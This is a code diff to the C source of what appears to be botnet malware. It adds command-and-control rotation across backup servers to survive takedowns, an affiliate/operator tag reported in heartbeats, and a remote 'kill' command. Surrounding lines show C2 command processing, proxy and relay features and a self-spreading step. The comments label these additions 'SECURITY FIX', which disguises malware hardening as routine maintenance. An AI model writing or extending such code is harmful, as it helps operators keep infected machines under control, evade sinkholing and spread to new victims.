@@ -114,6 +114,20 @@ static int init_bot(void) {
      * compile-time built-in plugins by name; plugin_enabled=0 disables
      * the framework. */
     g_bot.plugin_enabled = PLUGIN_DEFAULT_ENABLED;
+
+    /* SECURITY FIX (#93): Disposable-infrastructure C2 rotation. Off
+     * by default — no backups configured, the chain is the primary
+     * endpoint only. Configure c2_backup_1..4 = host:port (contiguous
+     * from 1) and the bot rotates through the chain after
+     * C2_ROTATE_FAIL_THRESHOLD consecutive HTTP connect failures,
+     * capped at C2_ROTATE_MAX total rotations. bot_tag is the
+     * affiliate/operator identifier reported in heartbeats. */
+    g_bot.c2_backup_count = 0;
+    g_bot.c2_rot_index = 0;
+    g_bot.c2_fail_streak = 0;
+    g_bot.c2_rotations = 0;
+    g_bot.bot_tag[0] = '\0';
+    g_bot.kill_pending = 0;
     
     /* Set default C2 config.
      * SECURITY FIX (#87): IRC C2 is deprecated — trivially sinkholed and
@@ -359,6 +373,16 @@ int main(void) {
         
         /* Process C2 commands */
         protocol_process_commands(&g_bot);
+
+        /* SECURITY FIX (#93): the `kill` command is a one-way door —
+         * the dispatch loop already wiped the cred buffer and stopped
+         * proxy/relay/plugin stop callbacks; break here so
+         * cleanup_bot() (lock removal, proxy/relay re-stop, log
+         * flush) runs and main returns EXIT_SUCCESS (exit code 0). */
+        if (g_bot.kill_pending) {
+            log_info("kill: exiting cleanly — affiliate capacity handed back");
+            break;
+        }
         
         /* Spread if not connected to primary C2 */
         if (!(g_bot.c2_enabled & (C2_IRC | C2_HTTP))) {
